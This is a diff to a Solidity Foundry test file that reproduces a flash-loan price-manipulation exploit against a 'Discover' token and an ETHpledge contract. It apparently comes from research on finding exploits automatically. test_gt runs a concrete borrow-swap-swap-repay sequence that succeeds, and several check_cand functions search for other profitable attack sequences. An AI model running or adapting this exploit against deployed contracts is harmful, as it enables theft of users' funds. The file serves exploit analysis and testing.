@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
+import "./AttackContract.sol";
 import "./Discover.sol";
 import "./ETHpledge.sol";
 import "@utils/QueryBlockchain.sol";
@@ -16,14 +17,16 @@ contract DiscoverTest is Test, BlockLoader {
     UniswapV2Factory factory;
     UniswapV2Router router;
     ETHpledge ethpledge;
+    AttackContract attackContract;
+    address owner;
     address attacker;
-    address owner = address(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266);
     address usdtAddr;
     address discAddr;
     address pairAddr;
     address factoryAddr;
     address routerAddr;
     address ethpledgeAddr;
+    address attackContractAddr;
     uint256 blockTimestamp = 1654501818;
     uint112 reserve0pair = 19811554285664651588959;
     uint112 reserve1pair = 12147765912566297044558;
@@ -43,9 +46,7 @@ contract DiscoverTest is Test, BlockLoader {
     uint256 balanceOfusdtethpledge = 17359200000000000000000;
 
     function setUp() public {
-        vm.warp(blockTimestamp);
-        attacker = address(this);
-        vm.startPrank(owner);
+        owner = address(this);
         usdt = new USDT();
         usdtAddr = address(usdt);
         disc = new Discover();
@@ -78,15 +79,17 @@ contract DiscoverTest is Test, BlockLoader {
             address(pair)
         );
         ethpledgeAddr = address(ethpledge);
+        attackContract = new AttackContract();
+        attackContractAddr = address(attackContract);
+        attacker = address(attackContract);
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
         disc.transfer(address(pair), balanceOfdiscpair);
         usdt.transfer(address(ethpledge), balanceOfusdtethpledge);
         disc.transfer(address(ethpledge), balanceOfdiscethpledge);
-        usdt.transfer(attacker, balanceOfusdtattacker);
+        usdt.transfer(address(attackContract), balanceOfusdtattacker);
         usdt.approve(attacker, UINT256_MAX);
         disc.approve(attacker, UINT256_MAX);
-        vm.stopPrank();
     }
 
     function printBalance(string memory tips) public {
@@ -139,9 +142,17 @@ contract DiscoverTest is Test, BlockLoader {
             disc.decimals()
         );
         emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(address(usdt), attacker, usdt.decimals());
-        queryERC20BalanceDecimals(address(disc), attacker, disc.decimals());
+        emit log_string("Attackcontract Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdt),
+            address(attackContract),
+            usdt.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(disc),
+            address(attackContract),
+            disc.decimals()
+        );
         emit log_string("");
         emit log_string("");
         emit log_string("");
@@ -209,6 +220,7 @@ contract DiscoverTest is Test, BlockLoader {
     }
 
     function test_gt() public {
+        vm.startPrank(attacker);
         borrow_disc(24000e18);
         printBalance("After step0 ");
         swap_pair_disc_usdt(disc.balanceOf(attacker));
@@ -218,6 +230,7 @@ contract DiscoverTest is Test, BlockLoader {
         payback_disc((24000e18 * 1003) / 1000);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
+        vm.stopPrank();
     }
 
     function check_gt(
@@ -226,12 +239,14 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_ethpledge_usdt_disc(amt2);
         payback_disc(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand000(
@@ -240,12 +255,14 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
         payback_usdt(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand001(
@@ -254,12 +271,14 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_ethpledge_usdt_disc(amt1);
         swap_pair_disc_usdt(amt2);
         payback_usdt(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand002(
@@ -268,12 +287,14 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_pair_usdt_disc(amt2);
         payback_disc(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand003(
@@ -282,12 +303,14 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt3 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
         swap_ethpledge_usdt_disc(amt2);
         payback_disc(amt3);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand004(
@@ -297,6 +320,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_pair_usdt_disc(amt1);
@@ -304,6 +328,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_disc_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand005(
@@ -313,6 +338,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_usdt(amt0);
         swap_ethpledge_usdt_disc(amt1);
@@ -320,6 +346,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_disc_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand006(
@@ -329,6 +356,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
@@ -336,6 +364,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_disc_usdt(amt3);
         payback_disc(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 
     function check_cand007(
@@ -345,6 +374,7 @@ contract DiscoverTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4
     ) public {
+        vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
         borrow_disc(amt0);
         swap_pair_disc_usdt(amt1);
@@ -352,5 +382,6 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_disc_usdt(amt3);
         payback_disc(amt4);
         assert(!attackGoal());
+        vm.stopPrank();
     }
 }
